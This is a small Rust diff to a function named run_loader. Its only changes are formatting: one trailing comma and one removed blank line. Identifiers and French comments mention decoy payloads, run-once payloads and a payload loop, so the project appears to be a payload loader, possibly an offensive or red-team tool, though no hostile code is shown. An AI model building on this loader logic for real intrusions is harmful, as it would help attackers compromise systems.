@@ -98,7 +98,7 @@ pub fn run_loader() {
         running_thread_decoy_payload: running_thread_decoy_payload,
         runonce_decoy_payload: runonce_decoy_payload,
         loop_nb: 1,
-        session_id:session_id.clone()
+        session_id: session_id.clone(),
     };
 
     loop {
@@ -119,7 +119,6 @@ pub fn run_loader() {
             //-> ou alors on fait une payload run forever qu'il ne faut utiliser que pour le decoy
             //TODO wait all thread to finish.
             //si on sleep pas , il est en run forever.... car il revient. ici.
-
         } else {
             if config.decoy_defuse_update_success {
                 config.exec_decoy_update(&mut run_data);
